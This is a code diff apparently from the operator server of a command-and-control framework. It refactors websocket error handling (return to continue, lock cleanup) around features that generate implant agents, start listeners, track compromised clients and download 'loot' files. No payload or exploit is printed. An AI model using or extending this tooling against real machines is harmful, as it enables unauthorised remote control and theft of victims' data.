@@ -543,7 +543,7 @@ type UploadTask struct {
 }
 
 // 有权限交互,必须先登录
-func User_index(web_route, error_str string) http.HandlerFunc {
+func User_index(error_str string) http.HandlerFunc {
 	return func(w http.ResponseWriter, r *http.Request) {
 
 		var uploadTask *UploadTask
@@ -648,11 +648,11 @@ func User_index(web_route, error_str string) http.HandlerFunc {
 				case "getResults": // 用户操作，获取执行结果
 					uid, ok := body["uid"].(string)
 					if !ok {
-						return
+						continue
 					}
 					taskid, ok := body["Taskid"].(string)
 					if !ok {
-						return
+						continue
 					}
 					results := Getresults(uid, taskid)
 					resp := map[string]interface{}{
@@ -664,7 +664,7 @@ func User_index(web_route, error_str string) http.HandlerFunc {
 					}
 					data, err := json.Marshal(resp)
 					if err != nil {
-						return
+						continue
 					}
 
 					err = clientWs.WriteMessage(
@@ -672,7 +672,7 @@ func User_index(web_route, error_str string) http.HandlerFunc {
 						data,
 					)
 					if err != nil {
-						return
+						continue
 					}
 				case "msg":
 					uid, _ := body["uid"].(string)
@@ -683,15 +683,13 @@ func User_index(web_route, error_str string) http.HandlerFunc {
 						clientWs.WriteJSON(map[string]interface{}{
 							"code": 500,
 							"path": "msg",
-
 							"message": errStr,
 						})
-						return
+						continue
 					}
 					clientWs.WriteJSON(map[string]interface{}{
 						"code": 200,
 						"path": "msg",
-
 						"message": "Message sent successfully",
 					})
 				case "insertKey":
@@ -754,7 +752,7 @@ func User_index(web_route, error_str string) http.HandlerFunc {
 
 							"message": "client not found",
 						})
-						return
+						continue
 					}
 					keyMu.Lock()
 					delete(key_map, uid)
@@ -837,7 +835,7 @@ func User_index(web_route, error_str string) http.HandlerFunc {
 							"path":    "downloadlog",
 							"message": "failed to open log file",
 						})
-						return
+						continue
 					}
 					defer file.Close()
 				
@@ -848,7 +846,7 @@ func User_index(web_route, error_str string) http.HandlerFunc {
 							"path":    "downloadlog",
 							"message": "failed to stat log file",
 						})
-						return
+						continue
 					}
 				
 					offset, sendSize, chunked, err := parseDownloadRange(body, stat.Size())
@@ -858,7 +856,7 @@ func User_index(web_route, error_str string) http.HandlerFunc {
 							"path":    "downloadlog",
 							"message": err.Error(),
 						})
-						return
+						continue
 					}
 				
 					if err := clientWs.WriteJSON(map[string]interface{}{
@@ -902,7 +900,7 @@ func User_index(web_route, error_str string) http.HandlerFunc {
 							"path":    "downloadChatFile",
 							"message": "missing filename",
 						})
-						return
+						continue
 					}
 				
 					filename = filepath.Base(filename)
@@ -915,7 +913,7 @@ func User_index(web_route, error_str string) http.HandlerFunc {
 							"path":    "downloadChatFile",
 							"message": "file not found",
 						})
-						return
+						continue
 					}
 				
 					offset, sendSize, chunked, err := parseDownloadRange(body, info.Size())
@@ -925,7 +923,7 @@ func User_index(web_route, error_str string) http.HandlerFunc {
 							"path":    "downloadChatFile",
 							"message": err.Error(),
 						})
-						return
+						continue
 					}
 				
 					file, err := os.Open(filePath)
@@ -981,7 +979,7 @@ func User_index(web_route, error_str string) http.HandlerFunc {
 							"path":    "download_loot",
 							"message": "uid required",
 						})
-						return
+						continue
 					}
 				
 					fileName, ok := body["file"].(string)
@@ -991,7 +989,7 @@ func User_index(web_route, error_str string) http.HandlerFunc {
 							"path":    "download_loot",
 							"message": "file required",
 						})
-						return
+						continue
 					}
 				
 					filePath := filepath.Join("uploads", uid, fileName)
@@ -1002,7 +1000,7 @@ func User_index(web_route, error_str string) http.HandlerFunc {
 							"path":    "download_loot",
 							"message": "file not found",
 						})
-						return
+						continue
 					}
 				
 					offset, sendSize, chunked, err := parseDownloadRange(body, info.Size())
@@ -1012,7 +1010,7 @@ func User_index(web_route, error_str string) http.HandlerFunc {
 							"path":    "download_loot",
 							"message": err.Error(),
 						})
-						return
+						continue
 					}
 				
 					file, err := os.Open(filePath)
@@ -1070,7 +1068,7 @@ func User_index(web_route, error_str string) http.HandlerFunc {
 
 							"message": "invalid err",
 						})
-						return
+						continue
 					}
 					clientWs.WriteJSON(map[string]interface{}{
 						"code": 200,
@@ -1087,7 +1085,7 @@ func User_index(web_route, error_str string) http.HandlerFunc {
 
 							"message": "invalid uid",
 						})
-						return
+						continue
 					}
 					username, ok := body["username"].(string)
 					if !ok {
@@ -1097,7 +1095,7 @@ func User_index(web_route, error_str string) http.HandlerFunc {
 
 							"message": "invalid username",
 						})
-						return
+						continue
 					}
 					client, err := Confirm_chan(uid, username)
 					if err != nil {
@@ -1107,7 +1105,7 @@ func User_index(web_route, error_str string) http.HandlerFunc {
 
 							"message": err.Error(),
 						})
-						return
+						continue
 					}
 					clientWs.WriteJSON(map[string]interface{}{
 						"code": 200,
@@ -1146,7 +1144,7 @@ func User_index(web_route, error_str string) http.HandlerFunc {
 							"path": "agentcode",
 							"message": "invalid server",
 						})
-						return
+						continue
 					}
 					port := arr[len(arr)-1]
 					arr[1] = port
@@ -1161,7 +1159,7 @@ func User_index(web_route, error_str string) http.HandlerFunc {
 							"path": "agentcode",
 							"message": "base not found",
 						})
-						return
+						continue
 					}
 					code := client_.Generate_agent(ptc, _os, server, Path, ConnPath, MsgPath, switch_key,
 						encry_key, download, result, _net, info, upload, list, option, username, uid,
@@ -1181,7 +1179,7 @@ func User_index(web_route, error_str string) http.HandlerFunc {
 
 							"message": "invalid port",
 						})
-						return
+						continue
 					}
 
 					var (
@@ -1212,48 +1210,48 @@ func User_index(web_route, error_str string) http.HandlerFunc {
 
 							"message": stopStr,
 						})
-						return
+						continue
 					}
 
+					blocked := false
 					clientDataMu.RLock()
 					for c := range client_data.Clients {
-						client := &client_data.Clients[c]
-						if client.Server == serverRemark {
-							clientDataMu.RUnlock()
-							stopStr := fmt.Sprintf(
-								log_word["stop_server"],
-							)
-							logger.WriteLog(stopStr)
-							clientWs.WriteJSON(map[string]interface{}{
-								"code": 400,
-								"path": "delserver",
-
-								"message": stopStr,
-							})
-							return
+						if client_data.Clients[c].Server == serverRemark {
+							blocked = true
+							break
 						}
 					}
 					clientDataMu.RUnlock()
+					if blocked {
+						stopStr := fmt.Sprintf(log_word["stop_server"])
+						logger.WriteLog(stopStr)
+						clientWs.WriteJSON(map[string]interface{}{
+							"code": 400, 
+							"path": "delserver", 
+							"message": stopStr,
+						})
+						continue
+					}
 
+					blocked = false
 					windows_clientMu.RLock()
 					for c := range windows_client_data.Clients {
-						client := &windows_client_data.Clients[c]
-						if client.Server == serverRemark {
-							windows_clientMu.RUnlock()
-							stopStr := fmt.Sprintf(
-								log_word["stop_server"],
-							)
-							logger.WriteLog(stopStr)
-							clientWs.WriteJSON(map[string]interface{}{
-								"code": 400,
-								"path": "delserver",
-
-								"message": stopStr,
-							})
-							return
+						if windows_client_data.Clients[c].Server == serverRemark {
+							blocked = true
+							break
 						}
 					}
 					windows_clientMu.RUnlock()
+					if blocked {
+						stopStr := fmt.Sprintf(log_word["stop_server"])
+						logger.WriteLog(stopStr)
+						clientWs.WriteJSON(map[string]interface{}{
+							"code": 400, 
+							"path": "delserver", 
+							"message": stopStr,
+						})
+						continue
+					}
 
 					serverDataMu.Lock()
 					for i := len(server_data.Servers) - 1; i >= 0; i-- {
@@ -1298,7 +1296,7 @@ func User_index(web_route, error_str string) http.HandlerFunc {
 
 							"message": "invalid uid",
 						})
-						return
+						continue
 					}
 					s_id, ok := body["s_id"].(string)
 					if !ok {
@@ -1308,7 +1306,7 @@ func User_index(web_route, error_str string) http.HandlerFunc {
 
 							"message": "invalid s_id",
 						})
-						return
+						continue
 					}
 					pos, ok := body["pos"].(string)
 					if !ok {
@@ -1318,7 +1316,7 @@ func User_index(web_route, error_str string) http.HandlerFunc {
 
 							"message": "invalid pos",
 						})
-						return
+						continue
 					}
 					success, errStr := ChangeMsh(
 						uid,
@@ -1335,7 +1333,7 @@ func User_index(web_route, error_str string) http.HandlerFunc {
 
 							"message": errStr,
 						})
-						return
+						continue
 					}
 					clientWs.WriteJSON(map[string]interface{}{
 						"code": 200,
@@ -1352,7 +1350,7 @@ func User_index(web_route, error_str string) http.HandlerFunc {
 
 							"message": "missing uid",
 						})
-						return
+						continue
 					}
 					indexStr, ok := body["index"].(string)
 					if !ok {
@@ -1362,7 +1360,7 @@ func User_index(web_route, error_str string) http.HandlerFunc {
 
 							"message": "missing index",
 						})
-						return
+						continue
 					}
 					index, err := strconv.Atoi(indexStr)
 					if err != nil {
@@ -1372,7 +1370,7 @@ func User_index(web_route, error_str string) http.HandlerFunc {
 
 							"message": "invalid index",
 						})
-						return
+						continue
 					}
 					queuesMu.RLock()
 					q := msgQueues[uid]
@@ -1384,7 +1382,7 @@ func User_index(web_route, error_str string) http.HandlerFunc {
 
 							"message": "uid queue not found",
 						})
-						return
+						continue
 					}
 					q.mu.Lock()
 					if index < 0 || index >= len(q.messages) {
@@ -1395,7 +1393,7 @@ func User_index(web_route, error_str string) http.HandlerFunc {
 
 							"message": "index out of range",
 						})
-						return
+						continue
 					}
 					q.messages = append(
 						q.messages[:index],
@@ -1411,6 +1409,31 @@ func User_index(web_route, error_str string) http.HandlerFunc {
 
 						"message": "message deleted",
 					})
+				case "getMsgMap":
+					uid, ok := body["uid"].(string)
+					if !ok || uid == "" {
+						clientWs.WriteJSON(map[string]interface{}{
+							"code": 400,
+							"path": "getMsgMap",
+							"message": "invalid uid",
+						})
+						continue
+					}
+					msgMap := sendMsg(uid)
+					if len(msgMap) == 0 {
+						clientWs.WriteJSON(map[string]interface{}{
+							"code": 404,
+							"path": "getMsgMap",
+							"message": "no messages found",
+						})
+						continue
+					}
+					clientWs.WriteJSON(map[string]interface{}{
+						"code": 200,
+						"path": "getMsgMap",
+						"message": "success",
+						"data":    msgMap,
+					})
 				case "delMsgMap":
 					uid, ok := body["uid"].(string)
 					if !ok || uid == "" {
@@ -1420,7 +1443,7 @@ func User_index(web_route, error_str string) http.HandlerFunc {
 
 							"message": "invalid uid",
 						})
-						return
+						continue
 					}
 					indexStr, ok := body["index"].(string)
 					if !ok {
@@ -1430,7 +1453,7 @@ func User_index(web_route, error_str string) http.HandlerFunc {
 
 							"message": "invalid index",
 						})
-						return
+						continue
 					}
 					index, err := strconv.Atoi(indexStr)
 					if err != nil {
@@ -1440,7 +1463,7 @@ func User_index(web_route, error_str string) http.HandlerFunc {
 
 							"message": "invalid index",
 						})
-						return
+						continue
 					}
 					mapMu.Lock()
 					var uidIndices []int
@@ -1461,7 +1484,7 @@ func User_index(web_route, error_str string) http.HandlerFunc {
 
 							"message": "index out of range",
 						})
-						return
+						continue
 					}
 					delIdx := uidIndices[index]
 					msg_map_list = append(
@@ -1487,7 +1510,7 @@ func User_index(web_route, error_str string) http.HandlerFunc {
 
 							"message": "invalid os",
 						})
-						return
+						continue
 					}
 					remark, ok := body["remark"].(string)
 					if !ok {
@@ -1497,7 +1520,7 @@ func User_index(web_route, error_str string) http.HandlerFunc {
 
 							"message": "invalid remark",
 						})
-						return
+						continue
 					}
 					codeWords, ok := body["codeWords"].(string)
 					if !ok || codeWords == "" {
@@ -1507,7 +1530,7 @@ func User_index(web_route, error_str string) http.HandlerFunc {
 
 							"message": "invalid codeWords",
 						})
-						return
+						continue
 					}
 					serverPluginMu.Lock()
 					originalLen := len(server_plugin.Plugins)
@@ -1546,7 +1569,7 @@ func User_index(web_route, error_str string) http.HandlerFunc {
 								codeWords,
 							),
 						})
-						return
+						continue
 					}
 
 					go PushData("", "PluginList")
@@ -1570,7 +1593,7 @@ func User_index(web_route, error_str string) http.HandlerFunc {
 							"path":    "delFileList",
 							"message": "invalid uid",
 						})
-						return
+						continue
 					}
 					indexStr, ok := body["index"].(string)
 					if !ok {
@@ -1579,7 +1602,7 @@ func User_index(web_route, error_str string) http.HandlerFunc {
 							"path":    "delFileList",
 							"message": "invalid index",
 						})
-						return
+						continue
 					}
 					deleted := Del_file_list(
 						uid,
@@ -1707,23 +1730,25 @@ func User_index(web_route, error_str string) http.HandlerFunc {
 
 							"message": "parameter does not exist",
 						})
-						return
+						continue
 					}
 					serverPluginMu.Lock()
+					exists := false
 					for i := range server_plugin.Plugins {
 						plugin := &server_plugin.Plugins[i]
-						if plugin.CodeWord == codeWords &&
-							plugin.OS == osName &&
-							plugin.Remark == remark {
-							serverPluginMu.Unlock()
-							clientWs.WriteJSON(map[string]interface{}{
-								"code": 400,
-								"path": "insertPlugin",
-
-								"message": "CodeWords already exists: " + codeWords,
-							})
-							return
+						if plugin.CodeWord == codeWords && plugin.OS == osName && plugin.Remark == remark {
+							exists = true
+							break
 						}
+					}
+					serverPluginMu.Unlock()
+					if exists {
+						clientWs.WriteJSON(map[string]interface{}{
+							"code": 400, 
+							"path": "insertPlugin",
+							"message": "CodeWords already exists: " + codeWords,
+						})
+						continue
 					}
 					// 参数切割
 					parameterParts := strings.Split(parameter, ",")
@@ -1737,38 +1762,35 @@ func User_index(web_route, error_str string) http.HandlerFunc {
 						clientWs.WriteJSON(map[string]interface{}{
 							"code": 400,
 							"path": "insertPlugin",
-
 							"message": "Parameter fields must not be empty",
 						})
-						return
+						continue
 					}
-					parameterDescParts := strings.Split(
-						parameterDesc,
-						",",
-					)
-					if len(parameterParts) == 1 &&
-						len(parameterDescParts) > 0 {
-						parameterDescParts = []string{
-							parameterDescParts[0],
-						}
+					parameterDescParts := strings.Split(parameterDesc, ",")
+					if len(parameterParts) == 1 && len(parameterDescParts) > 0 {
+						parameterDescParts = []string{parameterDescParts[0]}
 					}
-					// 参数重复检查
 					paramSet := make(map[string]bool)
+					dupParam := ""
 					for _, p := range parameterParts {
 						if p == "" {
 							continue
 						}
 						if paramSet[p] {
-							clientWs.WriteJSON(map[string]interface{}{
-								"code": 400,
-								"path": "insertPlugin",
-
-								"message": "Parameter fields must not duplicate: " + p,
-							})
-							return
+							dupParam = p
+							break
 						}
 						paramSet[p] = true
 					}
+					if dupParam != "" {
+						clientWs.WriteJSON(map[string]interface{}{
+							"code": 400, 
+							"path": "insertPlugin",
+							"message": "Parameter fields must not duplicate: " + dupParam,
+						})
+						continue
+					}
+					serverPluginMu.Lock()
 					plugin := Plugin{
 						Remark:        remark,
 						Code:          code,
@@ -1793,7 +1815,6 @@ func User_index(web_route, error_str string) http.HandlerFunc {
 					clientWs.WriteJSON(map[string]interface{}{
 						"code": 200,
 						"path": "insertPlugin",
-
 						"message": "Plugin inserted successfully for " + remark,
 					})
 				case "getNetdata":
@@ -1879,7 +1900,7 @@ func User_index(web_route, error_str string) http.HandlerFunc {
 
 							"message": "parameter does not exist",
 						})
-						return
+						continue
 					}
 					if responseHead != "" {
 						// 检查是不是合法 JSON
@@ -1891,10 +1912,9 @@ func User_index(web_route, error_str string) http.HandlerFunc {
 							clientWs.WriteJSON(map[string]interface{}{
 								"code": 400,
 								"path": "changeResponseHead",
-
 								"message": "ResponseHead must be a valid JSON string",
 							})
-							return
+							continue
 						}
 						serverDataMu.Lock()
 						for i := range server_data.Servers {
@@ -1952,17 +1972,16 @@ func User_index(web_route, error_str string) http.HandlerFunc {
 						"data": users,
 					})
 				case "startServer":
-					// body 转结构体
 					bodyData, err := json.Marshal(body)
 					if err != nil {
 						clientWs.WriteJSON(map[string]interface{}{
 							"code": 500,
 							"path": "startServer",
-
 							"message": "marshal body failed",
 						})
-						return
+						continue
 					}
+				
 					var requestData struct {
 						Port         string `json:"port"`
 						Path         string `json:"path"`
@@ -1990,47 +2009,44 @@ func User_index(web_route, error_str string) http.HandlerFunc {
 						BaseRounds   string `json:"base_rounds"`
 						ResponseHead string `json:"response_head"`
 					}
-					err = json.Unmarshal(
-						bodyData,
-						&requestData,
-					)
-					if err != nil {
+				
+					if err := json.Unmarshal(bodyData, &requestData); err != nil {
 						clientWs.WriteJSON(map[string]interface{}{
-							"code":    400,
-							"path":    "startServer",
+							"code": 400,
+							"path": "startServer",
 							"message": "invalid JSON",
 						})
-
-						return
+						continue
 					}
+				
 					if requestData.Path == "" || requestData.Port == "" || requestData.Protocol == "" || requestData.Remark == "" {
 						clientWs.WriteJSON(map[string]interface{}{
-							"code":    400,
-							"path":    "startServer",
+							"code": 400,
+							"path": "startServer",
 							"message": "parameter does not exist",
 						})
-						return
+						continue
 					}
-
-					// 检查端口和备注
+				
 					serverDataMu.RLock()
+					dupServer := false
 					for i := range server_data.Servers {
 						server := &server_data.Servers[i]
-						if requestData.Port == server.Port ||
-							requestData.Remark == server.Remark {
-							serverDataMu.RUnlock()
-							clientWs.WriteJSON(map[string]interface{}{
-								"code": 400,
-								"path": "startServer",
-
-								"message": "Port occupancy or remark already exists",
-							})
-							return
+						if requestData.Port == server.Port || requestData.Remark == server.Remark {
+							dupServer = true
+							break
 						}
 					}
 					serverDataMu.RUnlock()
-
-					// 检查路径重复
+					if dupServer {
+						clientWs.WriteJSON(map[string]interface{}{
+							"code": 400,
+							"path": "startServer",
+							"message": "Port occupancy or remark already exists",
+						})
+						continue
+					}
+				
 					paths := []string{
 						requestData.ConnPath,
 						requestData.MsgPath,
@@ -2048,107 +2064,132 @@ func User_index(web_route, error_str string) http.HandlerFunc {
 						requestData.KeyPart,
 						requestData.Filekey,
 					}
+				
 					pathSet := make(map[string]bool)
-					// 检查路径是否重复且不为空
+					badPathMsg := ""
 					for _, p := range paths {
 						if p == "" {
-							clientWs.WriteJSON(map[string]interface{}{
-								"code": 400,
-								"path": "startServer",
-
-								"message": "Path fields must not be empty",
-							})
-							return
+							badPathMsg = "Path fields must not be empty"
+							break
 						}
 						if pathSet[p] {
-							clientWs.WriteJSON(map[string]interface{}{
-								"code": 400,
-								"path": "startServer",
-
-								"message": "Path fields must not duplicate: " + p,
-							})
-							return
+							badPathMsg = "Path fields must not duplicate: " + p
+							break
 						}
 						pathSet[p] = true
 					}
-					// ResponseHead检查
+					if badPathMsg != "" {
+						clientWs.WriteJSON(map[string]interface{}{
+							"code": 400,
+							"path": "startServer",
+							"message": badPathMsg,
+						})
+						continue
+					}
+				
 					if requestData.ResponseHead != "" {
 						var temp map[string]string
-						if err := json.Unmarshal(
-							[]byte(requestData.ResponseHead),
-							&temp,
-						); err != nil {
+						if err := json.Unmarshal([]byte(requestData.ResponseHead), &temp); err != nil {
 							clientWs.WriteJSON(map[string]interface{}{
 								"code": 400,
 								"path": "startServer",
-
 								"message": "ResponseHead must be valid JSON",
 							})
-							return
+							continue
 						}
 					}
+				
 					if requestData.BaseRounds != "" {
 						if len(requestData.BaseRounds) != 64 {
 							clientWs.WriteJSON(map[string]interface{}{
 								"code": 400,
 								"path": "startServer",
-
 								"message": "Base64 table must be 64 characters",
 							})
-							return
+							continue
 						}
+				
 						charSet := make(map[rune]bool)
+						dupBase := false
 						for _, c := range requestData.BaseRounds {
 							if charSet[c] {
-								clientWs.WriteJSON(map[string]interface{}{
-									"code": 400,
-									"path": "startServer",
-
-									"message": "Base64 table contains duplicate characters",
-								})
-								return
+								dupBase = true
+								break
 							}
 							charSet[c] = true
 						}
+						if dupBase {
+							clientWs.WriteJSON(map[string]interface{}{
+								"code": 400,
+								"path": "startServer",
+								"message": "Base64 table contains duplicate characters",
+							})
+							continue
+						}
+				
 						decodeMap := buildDecodeMap(requestData.BaseRounds)
 						baseMutex.Lock()
 						base_map[requestData.Port] = requestData.BaseRounds
 						baseMutex.Unlock()
-
+				
 						cmapMutex.Lock()
 						code_map[requestData.Port] = decodeMap
 						cmapMutex.Unlock()
 					} else {
 						baseRounds := generateRandomBase64Table()
 						decodeMap := buildDecodeMap(baseRounds)
-
+				
 						baseMutex.Lock()
 						base_map[requestData.Port] = baseRounds
 						baseMutex.Unlock()
-
+				
 						cmapMutex.Lock()
 						code_map[requestData.Port] = decodeMap
 						cmapMutex.Unlock()
-
+				
 						requestData.BaseRounds = baseRounds
 					}
-					//启动服务
+				
 					if requestData.Protocol == "https" || requestData.Protocol == "http" || requestData.Protocol == "quic" {
 						handler := &MainHandler{}
 						serverManager := &MyServer{}
-						go protocol.Http_server(handler, serverManager, logger, requestData.Port, requestData.Path,
-							requestData.ConnPath, requestData.MsgPath, requestData.SwitchKey, requestData.EncryKey,
-							requestData.Download, requestData.Result, requestData.Net, requestData.Info, requestData.Upload,
-							requestData.List, requestData.Option, requestData.Protocol, requestData.Uid,
-							requestData.Hostname, requestData.KeyPart, requestData.Filekey, requestData.Remark,
-							requestData.CertContent, requestData.KeyContent, requestData.WindowsPro, requestData.BaseRounds, requestData.ResponseHead, requestData.Username, log_word)
+						go protocol.Http_server(
+							handler,
+							serverManager,
+							logger,
+							requestData.Port,
+							requestData.Path,
+							requestData.ConnPath,
+							requestData.MsgPath,
+							requestData.SwitchKey,
+							requestData.EncryKey,
+							requestData.Download,
+							requestData.Result,
+							requestData.Net,
+							requestData.Info,
+							requestData.Upload,
+							requestData.List,
+							requestData.Option,
+							requestData.Protocol,
+							requestData.Uid,
+							requestData.Hostname,
+							requestData.KeyPart,
+							requestData.Filekey,
+							requestData.Remark,
+							requestData.CertContent,
+							requestData.KeyContent,
+							requestData.WindowsPro,
+							requestData.BaseRounds,
+							requestData.ResponseHead,
+							requestData.Username,
+							log_word,
+						)
 					}
 					clientWs.WriteJSON(map[string]interface{}{
 						"code": 200,
 						"path": "startServer",
-
 						"message": "server started",
-						"port":    requestData.Port,
+						"port": requestData.Port,
 					})
 				case "uploadFile":
 					uid, ok := body["uid"].(string)
@@ -2454,7 +2495,7 @@ func GetInfo(uid, encry_str, key, clientIP string, code_map map[byte]int) {
 	proto := protocol + ":" + port
 
 	serverChan := make(chan string)
-	go updateServerClients(port, protocol, serverChan)
+	go updateServerClients(port, serverChan)
 	server_remark = <-serverChan
 
 	go put_client(username, shellname, osname, formattedTime, clientIP, currentDir, version, innet_ip, Remarks, uid, server_remark, executable, proto, timeInt, jitterInt)
@@ -2503,7 +2544,7 @@ func Windows_GetInfo(uid, encry_str, key, clientIP string, code_map map[byte]int
 
 	var server_remark string
 	serverChan := make(chan string)
-	go updateServerClients(port, protocol, serverChan)
+	go updateServerClients(port, serverChan)
 	server_remark = <-serverChan
 
 	Remarks := "null"
@@ -2515,7 +2556,7 @@ func Windows_GetInfo(uid, encry_str, key, clientIP string, code_map map[byte]int
 	// 删除连接条目
 	go DeleteEntry(uid, false)
 }
-func updateServerClients(port, protocol string, serverChan chan<- string) {
+func updateServerClients(port string, serverChan chan<- string) {
 	serverRemark := "unknown"
 	serverDataMu.Lock()
 	for i := range server_data.Servers {
@@ -5211,7 +5252,7 @@ func main() {
 	})
 
 	// --- 有权限交互 ---
-	http.Handle("/"+web_route, withCORS(User_index(web_route, error_str)))
+	http.Handle("/"+web_route, withCORS(User_index(error_str)))
 
 	// --- 调用 JS ---
 	http.HandleFunc("/"+web_js, func(w http.ResponseWriter, r *http.Request) {
